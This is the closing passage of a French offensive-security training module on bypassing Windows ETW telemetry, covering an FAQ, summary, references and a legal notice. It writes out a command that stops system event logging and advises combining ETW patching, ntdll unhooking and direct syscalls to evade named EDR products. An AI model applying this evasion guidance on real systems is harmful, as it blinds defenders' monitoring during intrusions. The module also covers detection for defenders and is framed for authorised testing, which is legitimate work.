- Les EDRs utilisent de plus en plus de hooks kernel

### Q3 : Pourquoi ne pas juste désactiver ETW au niveau système ?

**R** : Impossible sans admin + très bruyant. Les commandes comme :
```cmd
logman stop EventLog-System
```
Génèrent des alertes immédiates dans tous les EDRs.

### Q4 : ETW bypass protège-t-il contre TOUS les EDRs ?

**R** : Non. Les EDRs modernes utilisent plusieurs sources :
- ETW (que vous bypass)
- Hooks kernel (non affecté par votre patch user-mode)
- Minifilter drivers (filesystem)
- Network telemetry
- Memory scanning périodique

ETW bypass est une **couche** de défense, pas une solution complète.

### Q5 : Peut-on détecter qu'ETW est bypassé depuis un autre processus ?

**R** : Pas directement (isolation mémoire entre processus). Mais un EDR avec driver kernel peut :
1. Injecter un thread dans votre processus
2. Lire votre mémoire depuis le kernel
3. Comparer `ntdll.dll` avec la version sur disque

### Q6 : Quelle est la meilleure technique de bypass ?

**R** : Dépend du contexte :
- **Red Team classique** : Patch `ret` simple (méthode 1)
- **OPSEC élevée** : Hook sélectif (méthode 4) - filtre seulement les events sensibles
- **AV/EDR legacy** : Toutes les méthodes fonctionnent
- **EDR moderne (Falcon, SentinelOne)** : Combiner ETW bypass + unhooking ntdll + syscalls directs

---

## 13. Conclusion et Prochaines Étapes

### Résumé du Module

Vous avez appris :

✅ L'architecture ETW et son rôle dans la télémétrie Windows
✅ Les providers critiques pour la sécurité (.NET, PowerShell, AMSI)
✅ 4 techniques de bypass ETW (patching, syscalls, hooking, etc.)
✅ L'impact sur les EDRs et les limitations
✅ Les considérations OPSEC et détection Blue Team
✅ Code production-ready pour bypass ETW

### Modules Connexes

- **W36** : AMSI Bypass (complément idéal avec ETW)
- **W38** : Unhooking ntdll.dll (remove EDR hooks)
- **W39** : Direct Syscalls (éviter ntdll complètement)
- **W40** : Process Injection (post-bypass)

### Pour Aller Plus Loin

1. **Reverse Engineering ETW**
   - Analyser les structures internes dans WinDbg
   - Tracer le flux d'événements avec API Monitor

2. **EDR Evasion Avancée**
   - Combiner ETW bypass + AMSI bypass + Unhooking
   - Étudier les EDRs spécifiques (CrowdStrike, Carbon Black)

3. **Blue Team Response**
   - Développer des règles de détection Sigma
   - Créer des scripts de vérification d'intégrité

4. **Kernel Development**
   - Développer un driver pour hook ETW au niveau kernel
   - Étudier ETW Threat Intelligence (ETW TI)

---

## Annexe : Références et Crédits

### Papers et Recherches

- Adam Chester (MDSec) - "Hiding your .NET - ETW" (2020)
- Matt Graeber - "Subverting Sysmon" (ETW relation)
- Microsoft - "Event Tracing Architecture" (Official docs)

### Code Sources

- InlineExecute-Assembly (Cobalt Strike BOF)
- Donut (shellcode generator)
- SharpBlock (ETW bypass pour .NET)

### Communauté

- Red Team Village
- SpecterOps Blog
- LAPSUS$ Leaks (real-world usage examples)

---

**Date de dernière mise à jour** : 2025
**Version** : 1.0
**Auteur** : Cours C Full Offensive - Module W37

---

### Notes Légales

⚠️ **IMPORTANT** : Les techniques présentées dans ce module sont destinées UNIQUEMENT à :
- Formations de sécurité autorisées
- Tests d'intrusion avec autorisation écrite
- Recherche en sécurité dans un environnement contrôlé

L'utilisation non autorisée de ces techniques est **illégale** et peut entraîner des poursuites pénales.

---

*Fin du Module W37 : ETW Bypass*
